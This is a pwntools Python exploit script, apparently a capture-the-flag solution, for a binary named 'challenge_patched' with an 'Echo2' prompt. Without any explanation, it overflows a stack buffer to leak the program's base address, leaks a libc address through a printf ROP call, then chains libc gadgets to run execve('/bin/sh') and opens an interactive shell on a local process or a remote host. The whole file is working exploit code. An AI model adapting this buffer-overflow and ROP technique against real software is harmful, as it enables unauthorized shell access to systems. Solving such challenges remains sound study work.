#!/usr/bin/env python3

from pwn import *

exe = ELF("./challenge_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r, gdbscript='''
                   b*echo+57
                   c
                   ''')
        input()
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    payload = b'a'*279 + b"L"
    r.sendlineafter(b'Echo2\n', b"281")
    r.send(payload)

    r.recvuntil(b'a'*279)
    exe_leak = u64(r.recvline(keepends=False) + b'\0\0')
    exe.address = exe_leak - 4684
    log.info("leak exe: " + hex(exe_leak))
    log.info("base exe: " + hex(exe.address))

    ret = exe.address + 0x000000000000101a
    payload = b'b'*279
    payload += p64(ret) + p64(exe.plt['printf'])
    payload += p64(ret) + p64(exe.sym['echo'])
    r.sendlineafter(b'Echo2\n', str((len(payload) + 1)))
    r.send(payload)

    r.recvlines(2)
    leak_libc = u64(r.recvuntil(b'Welcome', drop=True) + b"\0\0")
    libc.address = leak_libc - 401616
    log.info("leak libc: " + hex(leak_libc))
    log.info("leak libc: " + hex(libc.address))

    rsi = libc.address + 0x000000000002be51
    rdi = libc.address + 0x000000000002a3e5
    rax_rdx_rbx = libc.address + 0x0000000000090528
    syscall = libc.address + 0x0000000000029db4
    payload = b'a'*279
    payload += flat(
        rsi, 0,
        rdi, next(libc.search(b"/bin/sh")),
        rax_rdx_rbx, 0x3b, 0x0, 0x0,
        syscall
    )
    r.sendlineafter(b'Echo2\n', str((len(payload) + 1)))
    r.send(payload)

    r.interactive()


if __name__ == "__main__":
    main()
